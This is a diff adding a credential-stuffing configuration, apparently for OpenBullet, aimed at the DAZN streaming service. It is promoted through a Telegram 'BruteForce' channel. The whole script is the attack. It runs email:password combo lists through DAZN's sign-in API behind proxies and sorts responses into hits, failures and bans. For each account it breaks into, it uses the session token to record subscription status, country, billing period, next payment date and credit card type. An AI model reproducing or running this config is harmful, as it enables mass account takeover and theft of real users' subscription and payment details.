@@ -1,0 +1,113 @@
+[SETTINGS]
+{
+  "Name": "Dazn.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-31T18:32:22.4744469+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | CPM Rate: 100-2000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#P REQUEST POST "https://isl-ca.dazn.com/misl/ca/v5/SignIn" 
+  CONTENT "{\"Email\":\"<USER>\",\"Password\":\"<PASS>\",\"DeviceId\":\"003a2c6b26\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 88" 
+  HEADER "origin: https://www.dazn.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.dazn.com/en-US/account/signin" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "InvalidPassword" 
+    KEY "InvalidEmailFormat" 
+  KEYCHAIN Success OR 
+    KEY "\"Result\":\"SignedIn\"," 
+  KEYCHAIN Ban OR 
+    KEY "DAZN isn't available in this country." 
+
+#Token PARSE "<SOURCE>" JSON "Token" -> VAR "Token" 
+
+#G REQUEST GET "https://myaccount-web-bff.ar.indazn.com/v1/users/me" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "authorization: Bearer <Token>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "origin: https://www.dazn.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.dazn.com/es-ES/myaccount/subscription" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36" 
+
+#status1 PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "status1" 
+
+#countryCode PARSE "<SOURCE>" JSON "countryCode" CreateEmpty=FALSE -> CAP "country" 
+
+#G REQUEST GET "https://subscriptions-service.dazn-api.com/fe/v1/subscriptions" 
+  
+  HEADER "Host: subscriptions-service.dazn-api.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.dazn.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.dazn.com/es-ES/myaccount/subscription" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#status PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "status" 
+
+#period PARSE "<SOURCE>" JSON "period" CreateEmpty=FALSE -> CAP "period" 
+
+#nextPaymentDate PARSE "<SOURCE>" JSON "nextPaymentDate" CreateEmpty=FALSE -> CAP "nextPaymentDate" 
+
+#creditCardType PARSE "<SOURCE>" JSON "creditCardType" CreateEmpty=FALSE -> CAP "creditCardType" 
+
+#currency PARSE "<SOURCE>" JSON "currency" CreateEmpty=FALSE -> CAP "currency" 
+
